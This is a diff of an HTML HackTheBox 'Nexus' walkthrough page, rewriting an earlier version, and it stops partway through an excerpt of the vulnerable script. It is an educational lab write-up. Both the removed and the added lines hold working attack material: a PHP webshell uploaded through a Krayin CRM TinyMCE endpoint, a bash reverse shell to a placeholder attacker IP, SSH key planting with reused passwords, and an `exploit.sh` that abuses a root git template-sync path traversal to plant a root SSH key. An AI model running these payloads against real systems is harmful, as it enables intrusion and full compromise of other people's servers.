@@ -7,19 +7,15 @@
 <meta name="referrer" content="strict-origin-when-cross-origin">
 <style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
 <title>HTB: Nexus — S. Markakis</title>
-<meta name="description" content="HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.">
+<meta name="description" content="HackTheBox Nexus — a leaked Gitea repo's first commit exposes a reused password into Krayin CRM, CVE-2026-38526 turns an authenticated TinyMCE upload into RCE as www-data, a second .env hands over SSH as jones, and a root-run template-sync script that writes git blobs by their tree-entry path is abused with a hand-crafted absolute-path tree object to drop a root cronjob — the whole chain driven from macOS.">
 <meta property="og:title" content="HTB: Nexus — S. Markakis">
-<meta property="og:description" content="HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.">
+<meta property="og:description" content="HackTheBox Nexus — Gitea commit leak → Krayin CRM CVE-2026-38526 upload RCE → SSH as jones → a root template-sync script writes files by their git tree-entry path, so a crafted absolute-path tree object drops a root cronjob. Driven from macOS.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://s-markakis.github.io/writeups/htb-nexus.html">
 <meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-nexus.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-nexus.png">
 <link rel="canonical" href="https://s-markakis.github.io/writeups/htb-nexus.html">
-
-
-
-
 
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -37,7 +33,6 @@
     --tag-bg:    #d8d6d0;
     --tag-text:  #555550;
     --accent:    #1a1a18;
-    /* terminal colors — muted to stay on-brand */
     --t-user:    #4a7c59;
     --t-host:    #5a6e8a;
     --t-path:    #7a6040;
@@ -63,9 +58,6 @@
     -webkit-font-smoothing: antialiased;
   }
 
-  /* ── NAV ── */
-
-  /* ── WRAPPER ── */
   .wrapper {
     position: relative;
     z-index: 1;
@@ -75,7 +67,6 @@
     padding: 4rem 2rem 8rem;
   }
 
-  /* ── POST HEADER ── */
   .post-header { margin-bottom: 2.5rem; }
 
   h1 {
@@ -109,7 +100,8 @@
     border-radius: 3px;
   }
   .tag-htb  { background: #c8d8c0; color: #2a4a28; }
-  .tag-git  { background: #d8c8b8; color: #5a3a18; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
 
   .divider {
     border: none;
@@ -117,7 +109,6 @@
     margin: 2rem 0;
   }
 
-  /* ── OVERVIEW BOX ── */
   .overview {
     background: var(--bg-code);
     border-left: 3px solid var(--text-dark);
@@ -128,7 +119,6 @@
     color: var(--text-mid);
   }
 
-  /* ── ATTACK CHAIN ── */
   .chain {
     display: flex;
     flex-wrap: wrap;
@@ -139,7 +129,7 @@
     padding: .9rem 1.2rem;
     border-radius: 4px;
     font-family: 'JetBrains Mono', monospace;
-    font-size: 0.78rem;
+    font-size: 0.74rem;
     margin: 1.5rem 0 2.5rem;
     color: var(--text-mid);
   }
@@ -153,7 +143,6 @@
   }
   .chain-arrow { color: var(--text); }
 
-  /* ── HEADINGS ── */
   h2 {
     font-family: 'Barlow Condensed', sans-serif;
     font-weight: 800;
@@ -171,16 +160,12 @@
     margin: 2rem 0 .6rem;
   }
 
-  p {
-    color: var(--text);
-    margin-bottom: 1rem;
-  }
+  p { color: var(--text); margin-bottom: 1rem; }
 
   strong { color: var(--text-dark); font-weight: 600; }
 
   a { color: var(--text-mid); }
 
-  /* ── INLINE CODE ── */
   code {
     font-family: 'JetBrains Mono', monospace;
     font-size: 0.82em;
@@ -191,7 +176,6 @@
     border-radius: 3px;
   }
 
-  /* ── TERMINAL BLOCK ── */
   .terminal {
     background: var(--bg-term);
     border: 1px solid var(--border);
@@ -226,7 +210,6 @@
     white-space: pre;
   }
 
-  /* prompt colors — muted to match cream palette */
   .pu  { color: var(--t-user);    font-weight: 700; }
   .ph  { color: var(--t-host);    font-weight: 700; }
   .pp  { color: var(--t-path); }
@@ -240,7 +223,6 @@
   .pb  { color: var(--t-blue); }
   .pco { color: var(--t-comment); }
 
-  /* ── ALERT BOXES ── */
   .alert {
     padding: .9rem 1.2rem;
     margin: 1.4rem 0;
@@ -252,7 +234,6 @@
   .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
   .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
 
-  /* ── TABLE ── */
   table {
     width: 100%;
     border-collapse: collapse;
@@ -280,15 +261,12 @@
   }
   tr:hover td { background: var(--bg-code); }
 
-  /* ── LISTS ── */
-  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
   li { color: var(--text); margin-bottom: .3rem; }
 
-  /* ── SUMMARY TABLE special cols ── */
   .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
   .st td:nth-child(2) { color: var(--text-mid); }
 
-  /* ── FOOTER ── */
   footer {
     border-top: 1px solid var(--border);
     padding: 2rem 3rem;
@@ -301,7 +279,6 @@
   footer a { color: var(--text-mid); text-decoration: none; }
   footer a:hover { color: var(--text-dark); }
 
-  /* ── BACK LINK ── */
   .back {
     display: inline-flex;
     align-items: center;
@@ -313,6 +290,16 @@
     transition: color .15s;
   }
   .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
 
   @media (max-width: 600px) {
     nav { padding: 1rem 1.2rem; }
@@ -369,7 +356,7 @@
     "@type": "WebPage",
     "@id": "https://s-markakis.github.io/blog.html#htb-nexus"
   },
-  "timeRequired": "PT8M"
+  "timeRequired": "PT10M"
 }
 </script>
 </head>
@@ -381,15 +368,14 @@
 
   <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
 
-  <!-- POST HEADER -->
   <div class="post-header">
     <h1>HTB: Nexus</h1>
     <div class="post-meta">
-      <span class="date">August 4, 2026</span>
+      <span class="date">September 12, 2026</span>
       <span class="tag tag-htb">HackTheBox</span>
-      <span class="tag tag-git">Gitea</span>
-      <span class="tag">Linux</span>
-      <span>&nbsp;6 min read</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Git internals</span>
+      <span>&nbsp;10 min read</span>
     </div>
   </div>
 
@@ -408,320 +394,266 @@
 
   <hr class="divider">
 
-  <!-- OVERVIEW -->
   <div class="overview">
-    Nexus revolves around a self-hosted <strong>Gitea</strong> instance backing a Krayin CRM deployment. The foothold is entirely credential-driven: a stale commit in a public Gitea repo leaks the CRM's database password, which unlocks an <strong>authenticated file-upload RCE</strong> in Krayin's email composer. From <code>www-data</code>, a <strong>.env</strong> file hands over a second password that gets reused straight into SSH. Root comes from a <strong>Gitea template-sync path traversal</strong> — a systemd timer that replays pushed git objects onto disk as root without sanitizing <code>../</code>, which I turned into a small automated exploit script.
+    Nexus is a chain of small leaks that add up. A vhost sweep turns up a <strong>Gitea</strong> instance and a <strong>Krayin CRM</strong> billing portal. Gitea hosts a <code>krayin-docker-setup</code> repo whose <em>first</em> commit still contains a password in <code>.env</code> — reused for the CRM admin. Krayin 2.2.0 is vulnerable to <strong>CVE-2026-38526</strong>, an authenticated TinyMCE upload with no type check, so a PHP webshell lands in a web-served directory and gives <code>www-data</code>. A second <code>.env</code> on disk yields yet another reused password — SSH as <code>jones</code>. The root step is the interesting one: a root-run "template sync" script pulls files out of Gitea template repos and writes each blob to <code>os.path.join(staging, filepath)</code>, where <code>filepath</code> is the git <em>tree entry name</em>. Git normally refuses <code>../</code> and leading-slash paths — but you can hand-forge a tree object whose entry name is an <strong>absolute path</strong>, and <code>os.path.join</code> throws away the staging prefix the moment it sees a leading <code>/</code>. That's an arbitrary root file-write, which becomes a cronjob and a root shell. All driven from macOS.
   </div>
 
   <div class="chain">
-    <span class="chain-node">Gitea commit history leak</span>
+    <span class="chain-node">vhost fuzz</span>
     <span class="chain-arrow">→</span>
-    <span class="chain-node">Krayin CRM creds</span>
+    <span class="chain-node">Gitea .env leak</span>
     <span class="chain-arrow">→</span>
-    <span class="chain-node">TinyMCE upload RCE</span>
+    <span class="chain-node">Krayin CVE-2026-38526</span>
     <span class="chain-arrow">→</span>
     <span class="chain-node">www-data</span>
     <span class="chain-arrow">→</span>
-    <span class="chain-node">.env password reuse</span>
+    <span class="chain-node">.env → SSH jones</span>
     <span class="chain-arrow">→</span>
-    <span class="chain-node">jones (SSH)</span>
-    <span class="chain-arrow">→</span>
-    <span class="chain-node">gitea-template-sync path traversal</span>
-    <span class="chain-arrow">→</span>
-    <span class="chain-node">root</span>
+    <span class="chain-node">git tree-path write → root</span>
   </div>
 
   <!-- ══ RECON ══ -->
   <h2>Reconnaissance</h2>
 
-  <h3>Nmap</h3>
-  <p>Two ports up front:</p>
+  <p>Two ports, and the web root redirects to a hostname — a hint to start fuzzing vhosts, not paths.</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
       <span class="term-label">nmap</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">nmap -sC -sV -A &lt;TARGET_IP&gt; -oA nexus</span>
-
-<span class="po">PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
-80/tcp open  http    nginx 1.24.0
-|_http-title: Did not follow redirect to http://nexus.htb</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -Pn -sV -p- --min-rate 2000 &lt;IP&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp open  http  nginx 1.24.0 (Ubuntu)   </span><span class="pco"># redirects to http://nexus.htb/</span></div>
   </div>
 
-  <p>Add the hostname and re-check the vhost:</p>
+  <p>The main site is static — the only thing of note is an email, <code>j.matthew@nexus.htb</code>, in a careers section. Directory brute-forcing finds nothing, so pivot to <strong>virtual-host</strong> discovery with ffuf, filtering out the default response size:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">/etc/hosts</span>
+      <span class="term-label">ffuf — vhost fuzzing</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  nexus.htb" | sudo tee -a /etc/hosts</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ffuf -u http://nexus.htb -H "Host: FUZZ.nexus.htb" \
+     -w dns-Jhaddix.txt -fs 154</span>
+<span class="pg">billing  [Status: 302, Size: 390]
+git      [Status: 200, Size: 14472]</span></div>
   </div>
 
-  <p>The landing page discloses an internal contact address, <code>j.matthew@nexus.htb</code> — a naming pattern worth keeping for later. A vhost/subdomain sweep turns up the real attack surface:</p>
+  <p>Add <code>nexus.htb</code>, <code>billing.nexus.htb</code> and <code>git.nexus.htb</code> to <code>/etc/hosts</code> (or drive everything with <code>curl -H "Host: …"</code>, which is what I did to keep things scriptable).</p>
+
+  <!-- ══ GITEA ══ -->
+  <h2>Gitea — a password in the first commit</h2>
+
+  <p><code>git.nexus.htb</code> is a Gitea instance with one public repo, <code>admin/krayin-docker-setup</code>. Gitea's API makes commit history trivial to walk without a browser:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">ffuf — vhost enum</span>
+      <span class="term-label">enumerate repo + commits (API)</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">ffuf -w subdomains.txt -H "Host: FUZZ.nexus.htb" -u http://&lt;TARGET_IP&gt; -fs &lt;baseline_size&gt;</span>
-
-<span class="po">git      [Status: 200]
-billing  [Status: 200]</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: git.nexus.htb" \
+     "http://&lt;IP&gt;/api/v1/repos/admin/krayin-docker-setup/commits" | jq -r '.[].sha'</span>
+<span class="po">9b817fa4…   </span><span class="pco"># latest</span><span class="po">
+1615c465…   </span><span class="pco"># initial</span></div>
   </div>
 
-  <table>
-    <tr><th>Host</th><th>Service</th><th>Notes</th></tr>
-    <tr><td>git.nexus.htb</td><td>Gitea</td><td>Self-hosted git, public repos browsable</td></tr>
-    <tr><td>billing.nexus.htb</td><td>Krayin CRM 2.2.0</td><td>Login-gated</td></tr>
-  </table>
-
-  <!-- ══ FOOTHOLD SETUP ══ -->
-  <h2>Credential Leak in Gitea Commit History</h2>
-
-  <p>The public repo <code>admin/krayin-docker-setup</code> is exactly what it says — the deployment scaffolding for the CRM. The current tree is clean, but the commit log isn't; an earlier commit still carries the database credentials before they were scrubbed:</p>
+  <p>The <code>.env</code> at HEAD has an empty <code>DB_PASSWORD</code> — but secrets committed once don't disappear when you edit the file, they just move down the history. Fetching <code>.env</code> at the <em>initial</em> commit tells a different story:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">git log -p — krayin-docker-setup</span>
+      <span class="term-label">.env at the first commit</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">git clone http://git.nexus.htb/admin/krayin-docker-setup.git</span>
-<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">cd krayin-docker-setup &amp;&amp; git log -p --all -- .env docker-compose.yml</span>
-
-<span class="po">- DB_USERNAME=j.matthew@nexus.htb
-- DB_PASSWORD=</span><span class="py">N27xh!!2ucY04</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: git.nexus.htb" \
+     "http://&lt;IP&gt;/admin/krayin-docker-setup/raw/commit/1615c465…/.env" | grep -i pass</span>
+<span class="pg">DB_PASSWORD=N27xh!!2ucY04</span></div>
   </div>
 
-  <div class="alert alert-info">Never assume a scrubbed commit stayed scrubbed — <code>git log -p</code> against a repo's full history routinely resurrects "removed" secrets, since deleting a line in a new commit doesn't touch the blob still referenced by the old one.</div>
+  <!-- ══ KRAYIN ══ -->
+  <h2>Krayin CRM — CVE-2026-38526 → www-data</h2>
 
-  <!-- ══ FOOTHOLD ══ -->
-  <h2>Initial Foothold — Authenticated File Upload RCE (Krayin CRM)</h2>
-
-  <p>Same credentials, different service — they log straight into Krayin CRM on <code>billing.nexus.htb</code>. Krayin's email composer uses TinyMCE, whose image-upload endpoint is where the fun starts: it accepts the file based on the client-supplied extension, not the actual content, so a PHP payload disguised as an image sails through.</p>
+  <p><code>billing.nexus.htb</code> is a <strong>Krayin CRM</strong> admin login. The email from the careers page plus the leaked password gets us in — Laravel's login just needs a valid <code>_token</code> pulled from the login form first:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">Burp — TinyMCE upload, Compose Email</span>
+      <span class="term-label">authenticate to Krayin</span>
     </div>
-    <div class="term-body"><span class="pco"># Mail → Compose → drag in image.png, intercept the POST in Burp</span>
-<span class="po">POST /admin/mail/compose/upload HTTP/1.1
-Host: billing.nexus.htb
-Content-Disposition: form-data; name="file"; filename="</span><span class="py">shell.php</span><span class="po">"
-Content-Type: image/png
-
-</span><span class="py">&lt;?php system($_GET['cmd']); ?&gt;</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -c cj -H "Host: billing.nexus.htb" http://&lt;IP&gt;/admin/login  </span><span class="pco"># grab _token + cookie</span>
+<span class="pd">$ </span><span class="pc">curl -s -b cj -c cj -H "Host: billing.nexus.htb" -D - -o /dev/null \
+     --data-urlencode "_token=$TOKEN" \
+     --data-urlencode "email=j.matthew@nexus.htb" \
+     --data-urlencode "password=N27xh!!2ucY04" http://&lt;IP&gt;/admin/login</span>
+<span class="pg">HTTP/1.1 302 Found
+Location: http://billing.nexus.htb/admin/dashboard</span></div>
   </div>
 
-  <p>Krayin stores the upload under a hashed filename and returns the path, no extension re-check on the way in:</p>
+  <p>The version (2.2.0, shown under the profile menu) is vulnerable to <strong>CVE-2026-38526</strong> — the <code>/admin/tinymce/upload</code> endpoint performs no server-side type or extension validation, and writes into the web-served <code>/storage/tinymce/</code>. So an authenticated user can upload a <code>.php</code> file (spoofing an image MIME to look normal) and then execute it with a plain GET. Rather than the public PoC's reverse shell, I uploaded a small scriptable webshell — no listener to babysit:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">trigger — www-data shell</span>
+      <span class="term-label">upload webshell → RCE</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=id"</span>
-<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
-
-<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=</span><span class="py">bash+-c+'bash+-i+%3E%26+/dev/tcp/&lt;YOUR_IP&gt;/4444+0%3E%261'</span><span class="pc">"</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">printf '&lt;?php system($_GET["c"]); ?&gt;' &gt; sh.php</span>
+<span class="pd">$ </span><span class="pc">curl -s -b cj -H "Host: billing.nexus.htb" -H "X-CSRF-TOKEN: $TOKEN" \
+     -F "_token=$TOKEN" -F "file=@sh.php;filename=sh.php;type=image/png" \
+     http://&lt;IP&gt;/admin/tinymce/upload</span>
+<span class="pg">{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/1b9c0b4a….php"}</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: billing.nexus.htb" "http://&lt;IP&gt;/storage/tinymce/1b9c0b4a….php?c=id"</span>
+<span class="pg">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></div>
   </div>
 
-  <div class="alert alert-success">Reverse shell as <strong>www-data</strong> — content-type validation missing on the TinyMCE media endpoint let a <code>.php</code> file land inside a web-servable storage path.</div>
+  <!-- ══ USER ══ -->
+  <h2>Lateral — a second .env → SSH as jones</h2>
 
-  <!-- ══ POST-EXPLOIT ══ -->
-  <h2>Post-Exploitation — Krayin .env</h2>
-
-  <p>Standard second pass for a PHP app: the framework's own environment file.</p>
+  <p><code>/etc/passwd</code> shows a real user, <code>jones</code>, whose home we can't read as <code>www-data</code>. But the deployed app carries its own live <code>.env</code>, and it holds a <em>different</em> password from the one in git:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">www-data — .env</span>
+      <span class="term-label">read the on-disk .env</span>
     </div>
-    <div class="term-body"><span class="pg">www-data@nexus:/var/www/html/krayin$ </span><span class="pc">cat .env | grep -i pass</span>
-<span class="po">DB_USERNAME=krayin
-</span><span class="py">DB_PASSWORD=y27xb3ha!!74GbR</span>
-
-<span class="pg">www-data@nexus:/var/www/html/krayin$ </span><span class="pc">cat /etc/passwd | grep 1000</span>
-<span class="po">jones:x:1000:1000::/home/jones:/bin/bash</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s -H "Host: billing.nexus.htb" \
+     "http://&lt;IP&gt;/storage/tinymce/1b9c0b4a….php?c=grep+PASS+/var/www/krayin/.env"</span>
+<span class="pg">DB_PASSWORD=y27xb3ha!!74GbR</span></div>
   </div>
 
-  <!-- ══ LATERAL ══ -->
-  <h2>Lateral Movement — SSH as jones (Password Reuse)</h2>
-
-  <p>The Krayin DB password works verbatim against jones's SSH login:</p>
+  <p>Password reuse does the rest — that value is <code>jones</code>'s SSH password. First thing in, drop an SSH key so the foothold is a stable <code>ssh -i</code> rather than a fragile session:</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">ssh — jones</span>
+      <span class="term-label">SSH + user.txt</span>
     </div>
-    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<span class="pd">└$ </span><span class="pc">ssh jones@nexus.htb</span>
-<span class="po">Password: </span><span class="py">y27xb3ha!!74GbR</span>
-
-<span class="pg">jones@nexus:~$ </span><span class="pc">id</span>
-<span class="pg">uid=1000(jones) gid=1000(jones) groups=1000(jones)</span>
-<span class="pg">jones@nexus:~$ </span><span class="pc">cat user.txt</span>
-<span class="py">HTB{REDACTED}</span></div>
-  </div>
-
-  <div class="alert alert-success">🚩 User flag captured — the CRM's database password was reused verbatim for jones's SSH account.</div>
-
-  <!-- ══ ENUM AS JONES ══ -->
-  <h2>Enumeration as jones — the Template Sync Timer</h2>
-
-  <p>A linpeas pass turns up an active systemd timer with an unusually short interval:</p>
-
-  <div class="terminal">
-    <div class="term-bar">
-      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">jones — systemctl</span>
-    </div>
-    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">systemctl list-timers</span>
-<span class="po">NEXT                        LEFT   LAST  PASSED  UNIT                      ACTIVATES
-Thu 2026-08-04 12:01:00 UTC 41s    -     -       </span><span class="py">gitea-template-sync.timer</span><span class="po"> gitea-template-sync.service</span>
-
-<span class="pg">jones@nexus:~$ </span><span class="pc">systemctl cat gitea-template-sync.service</span>
-<span class="po">[Service]
-User=root
-ExecStart=</span><span class="py">/usr/bin/python3 /etc/gitea/template-sync.py</span></div>
-  </div>
-
-  <p>The script runs as root, every 60 seconds. Reading it shows why that's a problem — it walks a pushed template repo with <code>git ls-tree</code>/<code>git cat-file</code> and writes every entry straight to a target path built from the tree entry's name, with no check for <code>../</code>:</p>
-
-  <div class="terminal">
-    <div class="term-bar">
-      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">/etc/gitea/template-sync.py — the bug</span>
-    </div>
-    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">cat /etc/gitea/template-sync.py</span>
-<span class="po">for entry in run(["git", "ls-tree", "-r", ref]).splitlines():
-    mode, _, blob, path = entry.split(None, 3)
-    </span><span class="pco"># path comes straight from the git tree, unsanitized</span>
-<span class="po">    dest = os.path.join(STAGING_ROOT, path)
-    data = run(["git", "cat-file", "-p", blob])
-    write(dest, data)   </span><span class="pco"># no realpath/containment check against STAGING_ROOT</span></div>
-  </div>
-
-  <div class="alert alert-warn">
-    <code>os.path.join</code> with an attacker-controlled second argument doesn't sanitize <code>../</code> — a git tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> writes exactly there once the sync service (root) runs the checkout. Any repo marked as a <strong>template</strong> in Gitea gets synced.
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sshpass -p 'y27xb3ha!!74GbR' ssh jones@&lt;IP&gt; \
+     "mkdir -p ~/.ssh; echo '$(cat key.pub)' &gt;&gt; ~/.ssh/authorized_keys"</span>
+<span class="pd">$ </span><span class="pc">ssh -i key jones@&lt;IP&gt; 'id; cat ~/user.txt'</span>
+<span class="po">uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)</span>
+<span class="pg">[redacted — user flag]</span></div>
   </div>
 
   <!-- ══ ROOT ══ -->
-  <h2>Privilege Escalation to Root — Gitea Template Sync Path Traversal</h2>
+  <h2>Root — abusing git tree-entry paths in a root sync script</h2>
 
-  <p>I wrapped the whole chain into a single script rather than replaying it by hand each time: mint an API token, stand up a template repo, commit a git tree that traverses out of the staging root into <code>/root/.ssh</code>, push it, wait one sync cycle, then SSH in on the planted key.</p>
-
-  <div class="terminal">
-    <div class="term-bar">
-      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">exploit.sh</span>
-    </div>
-    <div class="term-body"><span class="pco">#!/bin/bash
-# Nexus Privilege Escalation - Automated Exploit
-# Exploits: Gitea template sync path traversal (runs as root)</span>
-
-GITEA=<span class="py">"http://localhost:3000"</span>
-USER=<span class="py">"jones"</span>
-PASS=<span class="py">'y27xb3ha!!74GbR'</span>
-TARGET=<span class="py">"&lt;TARGET_IP&gt;"</span>
-
-<span class="pco"># STEP 1: local SSH keypair to plant as root's authorized_keys</span>
-ssh-keygen -t ed25519 -f /tmp/.exploit_key -N <span class="py">''</span> -q
-PUBKEY=$(cat /tmp/.exploit_key.pub)
-
-<span class="pco"># STEP 2: mint a Gitea API token as jones</span>
-TOKEN=$(curl -s -X POST $GITEA/api/v1/users/$USER/tokens \
-  -H <span class="py">"Content-Type: application/json"</span> \
-  -u <span class="py">"$USER:$PASS"</span> \
-  -d <span class="py">'{"name":"auto_token","scopes":["write:repository"]}'</span> \
-  | grep -o <span class="py">'"sha1":"[^"]*"'</span> | cut -d<span class="py">'"'</span> -f4)
-
-<span class="pco"># STEP 3: create a repo and mark it as a Gitea template
-#         (only template repos get pulled by the sync service)</span>
-curl -s -X POST $GITEA/api/v1/user/repos \
-  -H <span class="py">"Authorization: token $TOKEN"</span> \
-  -d <span class="py">'{"name":"rce","private":false}'</span> &gt; /dev/null
-curl -s -X PATCH $GITEA/api/v1/repos/$USER/rce \
-  -H <span class="py">"Authorization: token $TOKEN"</span> \
-  -d <span class="py">'{"template":true}'</span> &gt; /dev/null
-
-<span class="pco"># STEP 4: build a git tree that traverses out of the sync staging dir</span>
-mkdir -p /tmp/rce_exploit &amp;&amp; cd /tmp/rce_exploit
-git init
-mkdir -p <span class="py">"../../../../../root/.ssh"</span>
-echo <span class="py">"$PUBKEY"</span> &gt; <span class="py">"../../../../../root/.ssh/authorized_keys"</span>
-git add . &amp;&amp; git commit -m <span class="py">"Template injection"</span>
-
-<span class="pco"># STEP 5: push — the next sync cycle replays this tree as root</span>
-git remote add origin http://localhost:3000/$USER/rce.git
-git push -u origin main
-
-<span class="pco"># STEP 6: wait one sync interval (60s)</span>
-sleep 65
-
-<span class="pco"># STEP 7/8: key should now be live in /root/.ssh — connect</span>
-ssh -i /tmp/.exploit_key -o StrictHostKeyChecking=no root@$TARGET</span></div>
-  </div>
-
-  <p>Run against the box:</p>
+  <p>No sudo for <code>jones</code>. The lead is in <code>/etc/systemd/system</code>: a timer fires a <strong>root</strong> oneshot every minute.</p>
 
   <div class="terminal">
     <div class="term-bar">
       <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
-      <span class="term-label">exploit run</span>
+      <span class="term-label">the root timer</span>
     </div>
-    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">./exploit.sh</span>
-<span class="po">[*] STEP 1: Generating SSH key pair...
-[+] SSH key generated at /tmp/.exploit_key
-[*] STEP 2: Obtaining Gitea API token...
-[+] Token acquired: &lt;token&gt;
-[*] STEP 3: Creating template repository...
-[+] Repository created and marked as template
-[*] STEP 4: Building malicious git objects...
-[+] Malicious git objects ready
-[*] STEP 5: Pushing to Gitea repository...
-[+] Pushed to repository
-[*] STEP 6: Waiting for template sync (runs every 60 seconds)...
-[+] Sync period should have completed
-[*] STEP 7: Verifying SSH key installation...
-[+] SUCCESS! SSH key installed in /root/.ssh/authorized_keys
-[*] STEP 8: Spawning root shell...</span>
-
-<span class="pr">root@nexus:~# </span><span class="pc">id</span>
-<span class="pr">uid=0(root) gid=0(root) groups=0(root)</span>
-<span class="pr">root@nexus:~# </span><span class="pc">cat /root/root.txt</span>
-<span class="py">HTB{REDACTED}</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cat /etc/systemd/system/gitea-template-sync.service</span>
+<span class="po">[Service]
+Type=oneshot
+</span><span class="py">User=root</span><span class="po">
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py    </span><span class="pco"># + a .timer, every 1 min</span></div>
   </div>
 
-  <div class="alert alert-success">🚩 Root flag captured. The template-sync service trusted every path inside a pushed git tree and replayed it onto disk as root — marking a repo <code>template: true</code> was the only gate, and jones already had write access to create one.</div>
+  <p>The script (world-readable) queries Gitea for every repo marked as a <em>template</em>, then for each one runs <code>git ls-tree -r HEAD</code> on the bare repo and copies each blob into a staging directory. Here's the whole vulnerability, in three lines:</p>
 
-  <!-- ══ SUMMARY ══ -->
-  <h2>Summary</h2>
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">template-sync.py (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="po">stage_path = os.path.join(STAGING_DIR, owner, name)
+...
